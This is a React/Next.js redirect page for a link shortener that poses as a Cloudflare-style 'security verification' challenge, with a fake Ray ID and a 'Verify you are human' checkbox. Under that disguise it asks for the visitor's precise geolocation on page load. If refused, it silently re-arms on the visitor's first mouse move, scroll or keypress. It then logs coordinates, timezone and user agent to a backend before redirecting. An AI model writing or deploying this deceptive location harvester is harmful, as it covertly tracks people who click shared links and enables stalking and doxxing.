"use client";

import { useCallback, useEffect, useRef, useState } from "react";
import { useParams } from "next/navigation";
import { supabase } from "../../lib/supabaseClient";

export default function RedirectPage() {
  const { code } = useParams();
  // resolving | ready | locating | blocked | redirecting | notfound | unsupported
  const [status, setStatus] = useState("resolving");
  const [link, setLink] = useState(null); // { url_id, destination_url }
  const [errorMsg, setErrorMsg] = useState("");
  const startedRef = useRef(false);

  // Presentational only (Cloudflare-style look): hostname, ray id, tab title
  const [hostname, setHostname] = useState("");
  const [rayId, setRayId] = useState("");

  // Auto-prompt + gesture-retry engine refs
  const attemptSourceRef = useRef("auto"); // "auto" | "gesture"
  const linkRef = useRef(null);
  const gestureCleanupRef = useRef(null);

  useEffect(() => {
    setHostname(window.location.hostname);
    const bytes = new Uint8Array(8);
    crypto.getRandomValues(bytes);
    setRayId(
      Array.from(bytes)
        .map((b) => b.toString(16).padStart(2, "0"))
        .join("")
    );
    document.title = "Just a moment...";
    return () => {
      // unmount: disarm any pending gesture listeners
      if (gestureCleanupRef.current) gestureCleanupRef.current();
    };
  }, []);

  const startVerification = useCallback(() => {
    const l = linkRef.current;
    if (!l) return;
    if (!("geolocation" in navigator)) {
      setStatus("unsupported");
      return;
    }
    setStatus("locating");

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude, accuracy } = position.coords;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        try {
          // invoke() does NOT throw on HTTP errors: it returns { error }
          const { error } = await supabase.functions.invoke("log-visit", {
            body: {
              url_id: l.url_id,
              latitude,
              longitude,
              accuracy,
              timezone,
              user_agent: navigator.userAgent,
            },
          });
          if (error) console.error("log-visit failed:", error);
        } catch (e) {
          // Logging failed: still redirect so the visitor isn't stuck
          console.error("Failed to log visit:", e);
        }

        setStatus("redirecting");
        window.location.replace(l.destination_url);
      },
      (err) => {
        console.warn("Geolocation error:", err.code, err.message);

        if (attemptSourceRef.current === "auto") {
          // The automatic attempt was refused — some browsers (Safari,
          // stricter Chrome configs) deny geolocation with no user
          // activity. Arm a one-time retry on the visitor's FIRST
          // interaction of any kind: mouse move, tap, scroll, keypress.
          setStatus("ready");
          bindGestureRetry();
        } else {
          // This failure already came from a real interaction
          // (or a persistent "Block" permission) → show failure.
          setStatus("blocked");
        }
      },
      { enableHighAccuracy: false, timeout: 15000, maximumAge: 0 }
    );
  }, []);

  const bindGestureRetry = useCallback(() => {
    if (gestureCleanupRef.current) return; // already armed

    const events = ["mousemove", "mousedown", "touchstart", "keydown", "scroll"];
    const opts = { once: true, passive: true };

    function cleanup() {
      events.forEach((ev) => window.removeEventListener(ev, fire, opts));
      gestureCleanupRef.current = null;
    }
    function fire() {
      cleanup();
      attemptSourceRef.current = "gesture";
      startVerification();
    }

    events.forEach((ev) => window.addEventListener(ev, fire, opts));
    gestureCleanupRef.current = cleanup;
  }, [startVerification]);

  useEffect(() => {
    if (!code || startedRef.current) return;
    startedRef.current = true;

    (async () => {
      try {
        const res = await fetch(`/api/resolve?code=${encodeURIComponent(code)}`);
        const json = await res.json();
        if (!res.ok) throw new Error(json.error || "Failed to resolve this link.");
        setLink(json);
        linkRef.current = json;
        setStatus("ready");
        // AUTOMATIC attempt — prompts the browser on page load,
        // no click required (Chrome / Firefox and most Android).
        attemptSourceRef.current = "auto";
        startVerification();
      } catch (e) {
        setErrorMsg(e.message);
        setStatus("notfound");
      }
    })();
  }, [code, startVerification]);

  if (status === "notfound") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <div className="cf-box">
          <h2>Link not found</h2>
          <p className="cf-sub" style={{ marginTop: 8 }}>
            {errorMsg || "This short link does not exist."}
          </p>
        </div>
      </CfShell>
    );
  }

  if (status === "blocked" || status === "unsupported") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <h2 className="cf-h2 cf-error-text">Verification failed</h2>
        <p className="cf-sub">
          Verification could not be completed. Please try again.
        </p>
        <Widget state="failed" onRetry={startVerification} />
      </CfShell>
    );
  }

  if (status === "redirecting") {
    return (
      <CfShell hostname={hostname} rayId={rayId}>
        <h2 className="cf-h2">
          Verification successful. Waiting for {hostname || "the site"} to respond
        </h2>
        <Widget state="success" />
      </CfShell>
    );
  }

  // resolving | ready | locating
  return (
    <CfShell hostname={hostname} rayId={rayId}>
      <h2 className="cf-h2">Performing security verification...</h2>
      <p className="cf-sub">
        This page is performing a security check before you continue.
      </p>
      <Widget
        state={status === "locating" ? "verifying" : "check"}
        onVerify={
          status === "ready"
            ? () => {
                // clicking the checkbox is itself a gesture
                if (gestureCleanupRef.current) gestureCleanupRef.current();
                attemptSourceRef.current = "gesture";
                startVerification();
              }
            : null
        }
      />
    </CfShell>
  );
}

/* ---------- presentational components (no logic) ---------- */

function CfShell({ hostname, rayId, children }) {
  return (
    <div className="cf-wrapper">
      <div className="cf-main">
        <div className="cf-title-row">
          <h1>{hostname}</h1>
        </div>
        {children}
      </div>
      <footer className="cf-footer">
        <div className="cf-footer-inner">
          <div className="cf-footer-wrapper">
            <div>
              <div className="cf-ray">
                Ray ID: <code>{rayId}</code>
              </div>
            </div>
            <div className="cf-footer-links">
              <span className="cf-footer-text">
                Performance and Security by{" "}
                <a
                  rel="noopener noreferrer"
                  href="https://www.vigil.com/?utm_source=challenge&utm_campaign=m"
                  target="_blank"
                  aria-label="vigil, opens in a new tab"
                >
                  vigil
                </a>
              </span>
              <span className="cf-footer-divider"></span>
              <a
                target="_blank"
                rel="noopener noreferrer"
                href="https://www.vigil.com/privacypolicy/"
                aria-label="Privacy, opens in a new tab"
                className="cf-footer-text"
              >
                Privacy
              </a>
            </div>
          </div>
        </div>
      </footer>
    </div>
  );
}

// Original VIGIL logo: location-pin mark + wordmark (73x25, same slot)
function VigilLogo() {
  return (
    <svg
      className="cf-logo-svg"
      viewBox="0 0 73 25"
      role="img"
      aria-label="vigil"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        className="cf-logo-pin"
        fillRule="evenodd"
        d="M12 1.5C7.9 1.5 4.5 4.9 4.5 9c0 5.6 7.5 13.5 7.5 13.5S19.5 14.6 19.5 9c0-4.1-3.4-7.5-7.5-7.5zm0 4.8a2.7 2.7 0 110 5.4 2.7 2.7 0 010-5.4z"
      />
      <text className="cf-logo-text" x="25" y="17.5">
        VIGIL
      </text>
    </svg>
  );
}

// states: check | verifying | success | failed
function Widget({ state, onRetry, onVerify }) {
  return (
    <div className="cf-widget" aria-live="polite">
      <div className="cf-widget-state">
        {state === "check" && (
          <>
            <button
              type="button"
              className="cf-checkbox cf-checkbox-btn"
              aria-label="Verify you are human"
              onClick={onVerify || undefined}
              disabled={!onVerify}
            ></button>
            <span className="cf-state-label">Verify you are human</span>
          </>
        )}

        {state === "verifying" && (
          <>
            <svg className="cf-rays" viewBox="0 0 30 30" aria-hidden="true">
              <line x1="15" y1="1.5" x2="15" y2="6" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(45 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(90 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(135 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(180 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(225 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(270 15 15)" />
              <line x1="15" y1="1.5" x2="15" y2="6" transform="rotate(315 15 15)" />
            </svg>
            <span className="cf-state-label">Verifying...</span>
          </>
        )}

        {state === "success" && (
          <>
            <svg className="cf-state-icon" viewBox="0 0 30 30" aria-hidden="true">
              <circle className="cf-ring-green" cx="15" cy="15" r="13.5" />
              <circle className="cf-dot-green" cx="1.5" cy="15" r="1.65" />
              <circle className="cf-dot-green" cx="28.5" cy="15" r="1.3" />
              <circle className="cf-badge-green" cx="15" cy="15" r="11" />
              <path className="cf-check-white" d="M9.8 15.6 L13.6 19.2 L20.6 11.4" />
            </svg>
            <span className="cf-state-label">Success!</span>
          </>
        )}

        {state === "failed" && (
          <>
            <svg className="cf-state-icon" viewBox="0 0 30 30" aria-hidden="true">
              <circle className="cf-ring-red" cx="15" cy="15" r="13.5" />
              <circle className="cf-dot-red" cx="1.5" cy="15" r="1.65" />
              <circle className="cf-dot-red" cx="28.5" cy="15" r="1.3" />
              <circle className="cf-badge-red" cx="15" cy="15" r="11" />
              <line className="cf-excl" x1="15" y1="9" x2="15" y2="16.5" />
              <circle className="cf-excl-dot" cx="15" cy="19.4" r="1.5" />
            </svg>
            <span className="cf-state-label cf-state-failed">
              Verification failed
              <a
                href="#retry"
                onClick={(e) => {
                  e.preventDefault();
                  onRetry();
                }}
              >
                Troubleshoot
              </a>
            </span>
          </>
        )}
      </div>

      <div className="cf-widget-side">
        <a
          className="cf-widget-logo"
          href="https://www.vigil.com/?utm_source=challenge&utm_campaign=widget"
          target="_blank"
          rel="noopener noreferrer"
          aria-label="vigil, opens in a new tab"
        >
          <VigilLogo />
        </a>
        <a
          className="cf-widget-privacy"
          href="https://www.vigil.com/privacypolicy/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Privacy
        </a>
      </div>
    </div>
  );
}